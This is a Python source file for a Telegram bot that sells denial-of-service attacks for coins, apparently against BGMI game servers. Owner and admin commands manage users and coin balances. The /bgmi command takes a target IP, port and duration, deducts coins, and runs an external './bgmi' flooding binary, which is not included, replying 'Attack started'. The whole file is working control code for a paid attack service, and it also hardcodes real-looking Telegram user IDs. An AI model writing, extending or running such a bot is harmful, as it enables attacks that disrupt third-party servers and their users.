import telebot
import os
import json
import subprocess

bot = telebot.TeleBot(os.getenv("TELEGRAM_BOT_TOKEN"))

OWNER_ID = "1383324178"  # Change this to your owner ID
admin_ids = {"6060545769", "1871909759"}  # Admins list
USER_FILE = "users.txt"
COINS_FILE = "coins.json"
COIN_RATE = 10  # 1 sec = 10 coins

# Load user coins
def load_coins():
    if os.path.exists(COINS_FILE):
        with open(COINS_FILE, "r") as file:
            return json.load(file)
    return {}

user_coins = load_coins()

# Save user coins
def save_coins():
    with open(COINS_FILE, "w") as file:
        json.dump(user_coins, file, indent=4)

# Load authorized users
def load_users():
    if os.path.exists(USER_FILE):
        with open(USER_FILE, "r") as file:
            return set(file.read().splitlines())
    return set()

allowed_users = load_users()

# Owner Promotes Admin
@bot.message_handler(commands=['promote'])
def promote_admin(message):
    user_id = str(message.chat.id)
    if user_id == OWNER_ID:
        command = message.text.split()
        if len(command) > 1:
            new_admin = command[1]
            if new_admin not in admin_ids:
                admin_ids.add(new_admin)
                bot.reply_to(message, f"✅ User {new_admin} promoted to Admin.")
            else:
                bot.reply_to(message, "❌ User is already an Admin.")
        else:
            bot.reply_to(message, "Usage: /promote <user_id>")
    else:
        bot.reply_to(message, "🚫 Only the Owner can use this command.")

# Owner Demotes Admin
@bot.message_handler(commands=['demote'])
def demote_admin(message):
    user_id = str(message.chat.id)
    if user_id == OWNER_ID:
        command = message.text.split()
        if len(command) > 1:
            admin_to_remove = command[1]
            if admin_to_remove in admin_ids:
                admin_ids.remove(admin_to_remove)
                bot.reply_to(message, f"✅ Admin {admin_to_remove} has been demoted.")
            else:
                bot.reply_to(message, "❌ User is not an Admin.")
        else:
            bot.reply_to(message, "Usage: /demote <user_id>")
    else:
        bot.reply_to(message, "🚫 Only the Owner can use this command.")

# Admin Adds Coins to User
@bot.message_handler(commands=['addcoins'])
def add_coins(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == OWNER_ID:
        command = message.text.split()
        if len(command) > 2:
            target_user = command[1]
            try:
                amount = int(command[2])
                if amount <= 0:
                    raise ValueError
                user_coins[target_user] = user_coins.get(target_user, 0) + amount
                save_coins()
                bot.reply_to(message, f"✅ Added {amount} coins to user {target_user}.")
            except ValueError:
                bot.reply_to(message, "❌ Invalid amount. Enter a positive number.")
        else:
            bot.reply_to(message, "Usage: /addcoins <user_id> <amount>")
    else:
        bot.reply_to(message, "🚫 Only Admins can use this command.")

# Admin Checks User Coins
@bot.message_handler(commands=['checkcoins'])
def check_user_coins(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == OWNER_ID:
        command = message.text.split()
        if len(command) > 1:
            target_user = command[1]
            balance = user_coins.get(target_user, 0)
            bot.reply_to(message, f"💰 User {target_user} has {balance} coins.")
        else:
            bot.reply_to(message, "Usage: /checkcoins <user_id>")
    else:
        bot.reply_to(message, "🚫 Only Admins can use this command.")

# User Checks Own Coins
@bot.message_handler(commands=['mycoins'])
def my_coins(message):
    user_id = str(message.chat.id)
    balance = user_coins.get(user_id, 0)
    bot.reply_to(message, f"💰 You have {balance} coins.")

# Admin Adds Users
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == OWNER_ID:
        command = message.text.split()
        if len(command) > 1:
            new_user = command[1]
            if new_user not in allowed_users:
                allowed_users.add(new_user)
                with open(USER_FILE, "a") as file:
                    file.write(f"{new_user}\n")
                bot.reply_to(message, f"✅ User {new_user} has been granted access.")
            else:
                bot.reply_to(message, "❌ User already has access.")
        else:
            bot.reply_to(message, "Usage: /add <user_id>")
    else:
        bot.reply_to(message, "🚫 Only Admins can use this command.")

# Admin Removes Users
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == OWNER_ID:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_users:
                allowed_users.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user in allowed_users:
                        file.write(f"{user}\n")
                bot.reply_to(message, f"✅ User {user_to_remove} has been removed.")
            else:
                bot.reply_to(message, "❌ User not found.")
        else:
            bot.reply_to(message, "Usage: /remove <user_id>")
    else:
        bot.reply_to(message, "🚫 Only Admins can use this command.")

# Modified /bgmi Attack Command with Coin Deduction & Execution
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_users:
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])  # Time in seconds

            required_coins = time * COIN_RATE  # Calculate required coins
            balance = user_coins.get(user_id, 0)

            if balance < required_coins:
                bot.reply_to(message, f"❌ Not enough coins! You need {required_coins} coins but only have {balance}.")
                return
            
            # Deduct coins
            user_coins[user_id] -= required_coins
            save_coins()

            # Execute the external ./bgmi script
            try:
                subprocess.run(["./bgmi", target, str(port), str(time)], check=True)
                bot.reply_to(message, f"🚀 Attack started on {target} for {time} seconds! 🔥\n💰 {required_coins} coins deducted.")
            except Exception as e:
                bot.reply_to(message, f"⚠️ Error executing attack: {str(e)}")
        else:
            bot.reply_to(message, "✅ Usage: /bgmi <target> <port> <time>")
    else:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")

# Start Bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")
